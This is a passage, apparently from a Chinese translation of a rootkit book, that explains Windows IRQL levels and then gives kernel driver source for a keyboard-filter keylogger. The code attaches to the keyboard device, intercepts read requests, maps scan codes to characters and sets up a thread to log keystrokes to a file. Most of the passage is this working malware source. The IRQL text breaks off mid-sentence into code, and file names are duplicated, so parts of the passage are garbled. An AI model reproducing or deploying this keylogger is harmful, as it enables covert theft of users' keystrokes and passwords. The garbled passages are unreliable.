运行在此级别的例程：一些分发函数运行在这个处理级别上。在这个处理级别 上
APC_LEVEL 中断会被屏蔽掉。
IRQL = DISPATCH_LEVEL
运行在此级别的例程:StartIo,，AdapterControl,，AdapterListControl,，ControllerControl,，
IoTimer,，Cancel (在等待 cancel 旋转锁的时候),，DpcForIsr，CustomTimerDpc，和 CustomDpc。
DISPATCH_LEVEL 和 APC_LEVEL 中断会被屏蔽掉，设备中断，时钟中断和电源故障中断
都可以发生在这个处理级别上。
IRQL = DIRQL
运行在此级别的例程：InterruptService 和 SynchCritSection 。所有 IRQLFlags
|=
(DO_BUFFERED_IO
|
DO_POWER_PAGABLE);
((PDEVICE_OBJECT)(*ppNewDevice))->Flags &= ~DO_DEVICE_INITIALIZING;
// Attach the new device
RtlInitUnicodeString( &unicodeName, deviceName );
status = IoAttachDevice( *ppNewDevice,
&unicodeName,
ppOldDevice );
// Prevent unload if load failed
if( !NT_SUCCESS( status ) )
{
IoDeleteDevice( *ppNewDevice );
*ppNewDevice = NULL;
}
else
{
// Prepare the keylogging thread
StartKeylogger( pDriverObject );
}
return status;
}
这个函数和网络过滤器的插入函数 insertNetworkFilter 非常相似．只是创建的新设备类
型变成了 FILE_DEVICE_KEYBOARD,标志位有点不同．
filterManager.h
filterManager.h
filterManager.h
filterManager.h
filterManager.h.仅仅是增加了对函数 insertKeyboardFilter 的声明．
IoManager.c
IoManager.c
IoManager.c
IoManager.c
IoManager.c 在 OnDispatch 函数里增加了9行代码．OnDispatch 是所有 I/O 都要经过的
地方．增加的代码简单地保证了能够在所有的键盘读请求里加入了一个完成例程．
// Intercept I/O Request Packets to the keyboard
if( DeviceObject == newKeyboardDevice )
{
if( irpStack->MajorFunction == IRP_MJ_READ )
return OnKeyboardRead( DeviceObject, Irp, irpStack );
IoSkipCurrentIrpStackLocation ( Irp );
return IoCallDriver( oldKeyboardDevice, Irp );
}
keyManager.h
keyManager.h
keyManager.h
keyManager.h
keyManager.h
这个文件是为了给在 keyManager.c 里实现的函数提供支持的．
// Copyright Ric Vieler, 2006
// Support header for keyManager.c
#ifndef _KEY_MANAGER_H_
#define _KEY_MANAGER_H_
typedef struct _KEY_DATA
{
LIST_ENTRY ListEntry;
char KeyData;
char KeyFlags;
}KEY_DATA;
typedef struct _KEY_STATE
{
BOOL CtrlKey;
BOOL AltKey;
BOOL ShiftKey;
}KEY_STATE;
typedef struct _KEYBOARD_STRUCT
{
PETHREAD threadObject;
BOOL terminateFlag;
KEY_STATE keyState;
HANDLE hLogFile;
KSEMAPHORE keySemaphore;
KSPIN_LOCK keyLock;
LIST_ENTRY keyList;
KSPIN_LOCK irpLock;
LIST_ENTRY irpList;
}KEYBOARD_STRUCT;
#define NUL 0
#define SPACE 1
#define ENTER 2
#define LSHIFT 3
#define RSHIFT 4
#define CTRL 5
#define ALT 6
NTSTATUS OnKeyboardRead(IN PDEVICE_OBJECT pDeviceObject,
IN PIRP pIrp,
PIO_STACK_LOCATION irpStack );
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject,
IN PIRP pIrp,
IN PVOID Context);
void OnCancel( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp );
NTSTATUS InitializeLogThread(IN PDRIVER_OBJECT pDriverObject);
VOID KeyLoggerThread(PVOID StartContext);
void GetKey(KEY_DATA* keyData, char* key);
void StartKeylogger(PDRIVER_OBJECT pDriverObject);
void StopKeylogger(PDEVICE_OBJECT* ppOldDevice,
PDEVICE_OBJECT* ppNewDevice );
#endif
keyManager.c
keyManager.c
keyManager.c
keyManager.c
keyManager.c 是本章要重点关注的文件．记录线程的启动和停止，完成例程的注册，在
把按键数据写入文件之前对它的解码这些都在这个文件里实现．这些函数的详细信息如下：
// keyManager
// Copyright Ric Vieler, 2006
// Keylogger routines
#include "ntddk.h"
#include "Ghost.h"
#include "keyManager.h"
#include "ntddkbd.h"
extern KEYBOARD_STRUCT keyboardData;
extern PDEVICE_OBJECT oldKeyboardDevice;
char keyMap[84] = {NUL,NUL,'1','2','3','4','5','6','7','8',
'9','0','-','=',NUL,NUL,'q','w','e','r',
't','y','u','i','o','p','[',']',ENTER,CTRL,
'a','s','d','f','g','h','j','k','l',';',
'\'','`',LSHIFT,'\\','z','x','c','v','b','n',
'm',',','.','/',RSHIFT,NUL,ALT,SPACE,NUL,NUL,
NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,
NUL,'7','8','9',NUL,'4','5','6',NUL,'1',
'2','3','0'};
char shiftKeyMap[84] = {NUL,NUL,'!','@','#','$','%','^','&','*',
'(',')','_','+',NUL,NUL,'Q','W','E','R',
'T','Y','U','I','O','P','{','}',ENTER,NUL,
'A','S','D','F','G','H','J','K','L',':',
'"','~',LSHIFT,'|','Z','X','C','V','B','N',
'M','','?',RSHIFT,NUL,NUL,SPACE,NUL,NUL,
NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,NUL,
NUL,'7','8','9',NUL,'4','5','6',NUL,'1',
'2','3','0'};
NTSTATUS OnKeyboardRead( PDEVICE_OBJECT pDeviceObject,
PIRP Irp,
PIO_STACK_LOCATION irpStack )
{
NTSTATUS status;
PIRP newIrp;
PIO_STACK_LOCATION newirpStack;
// create new irp
newIrp = IoAllocateIrp( pDeviceObject->StackSize, FALSE );
IoSetNextIrpStackLocation( newIrp );
newirpStack = IoGetCurrentIrpStackLocation( newIrp );
newIrp->AssociatedIrp.SystemBuffer = Irp->AssociatedIrp.SystemBuffer;
newIrp->RequestorMode = KernelMode;
// Irp->RequestorMode;
newIrp->Tail.Overlay.Thread = Irp->Tail.Overlay.Thread;
newIrp->Tail.Overlay.OriginalFileObject = Irp->Tail.Overlay.OriginalFileObject;
newIrp->Flags = Irp->Flags;
newirpStack->MajorFunction = IRP_MJ_READ;
newirpStack->MinorFunction = irpStack->MinorFunction;
newirpStack->Parameters.Read = irpStack->Parameters.Read;
newirpStack->DeviceObject = pDeviceObject;
newirpStack->FileObject = irpStack->FileObject;
newirpStack->Flags = irpStack->Flags;
newirpStack->Control = 0;
IoCopyCurrentIrpStackLocationToNext( newIrp );
IoSetCompletionRoutine( newIrp, OnReadCompletion, Irp, TRUE, TRUE, TRUE );
// save old irp
Irp->Tail.Overlay.DriverContext[0] = newIrp;
ExInterlockedInsertHeadList( &keyboardData.irpList,
&Irp->Tail.Overlay.ListEntry,
&keyboardData.irpLock );
// set cancel routine to allow driver to unload
IoSetCancelRoutine( Irp, OnCancel );
// pass new irp in place of old irp
status = IoCallDriver( oldKeyboardDevice, newIrp );
if( status == STATUS_PENDING )
return status;
status = Irp->IoStatus.Status;
IoCompleteRequest( Irp, IO_KEYBOARD_INCREMENT );
return status;
}
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject,
IN PIRP pIrp,
IN PVOID Context)
{
PIRP origIrp;
KIRQL aIrqL;
BOOL found = FALSE;
if( pIrp->Cancel )
{
// driver unloading